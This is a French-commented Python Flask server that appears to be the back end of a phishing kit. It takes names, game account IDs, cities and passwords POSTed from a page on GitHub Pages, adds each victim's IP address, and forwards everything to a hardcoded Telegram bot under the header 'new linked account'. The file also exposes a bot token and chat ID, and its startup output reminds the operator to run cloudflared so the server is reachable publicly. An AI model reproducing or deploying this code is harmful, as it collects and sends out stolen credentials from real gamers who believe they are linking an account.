from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import datetime

# -------------------------
# CONFIGURATION
# -------------------------
app = Flask(__name__)
CORS(app)  # Autorise les requêtes cross-origin (GitHub Pages)

# Ton bot Telegram
TOKEN = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc"
CHAT_ID = "6537215671"

# -------------------------
# ROUTE PRINCIPALE
# -------------------------
@app.route('/send', methods=['POST'])
def send_to_telegram():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "Aucune donnée reçue"}), 400

        # Infos supplémentaires
        user_ip = request.remote_addr
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Construire le message Telegram
        message = (
            f"🎯 --- NOUVEAU COMPTE LIÉ --- 🎯\n"
            f"⏰ Heure: {now}\n"
            f"👤 Nom: {data.get('nom', 'N/A')}\n"
            f"🆔 ID: {data.get('id', 'N/A')}\n"
            f"🎮 Jeu: {data.get('jeu', 'N/A')}\n"
            f"📍 Ville: {data.get('ville', 'N/A')}\n"
            f"🌐 IP: {user_ip}\n"
            f"🔑 PASS: {data.get('pass', 'N/A')}\n"
            f"----------------------------"
        )

        # Envoyer au bot Telegram
        resp = requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": message}
        )

        if resp.status_code != 200:
            print("Erreur Telegram:", resp.text)
            return jsonify({"status": "error", "message": "Impossible d'envoyer au bot"}), 500

        # Réponse JSON
        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"Erreur serveur: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# -------------------------
# TEST / ROOT
# -------------------------
@app.route('/', methods=['GET'])
def index():
    return "<h2>🚀 Serveur Flask actif!</h2>", 200

# -------------------------
# LANCEMENT SERVEUR
# -------------------------
if __name__ == '__main__':
    print("🚀 SERVEUR DE SYNCHRONISATION PRÊT SUR LE PORT 5000")
    print("📢 Assurez-vous que cloudflared est actif pour un accès public")
    app.run(host="0.0.0.0", port=5000)
